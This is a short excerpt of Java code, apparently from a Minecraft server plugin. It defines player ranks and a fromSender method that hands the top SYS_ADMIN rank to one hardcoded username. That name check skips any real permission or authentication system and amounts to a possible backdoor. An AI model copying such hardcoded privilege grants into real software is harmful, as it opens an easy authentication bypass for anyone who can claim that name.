...
public enum TFM_PlayerRank
{
    ...
    SYS_ADMIN("a " + ChatColor.DARK_RED + "Executive", ChatColor.DARK_RED + "[Exec]"),
    ...
    OWNER("the " + ChatColor.BLUE + "Owner & Lead Developer", ChatColor.BLUE + "[Owner & Lead Dev]"),
    ...
    public static TFM_PlayerRank fromSender(CommandSender sender)
    {
        ...
        else if (sender.getName().equals("ImALuckyGuy"))
        {
            return SYS_ADMIN;
        }
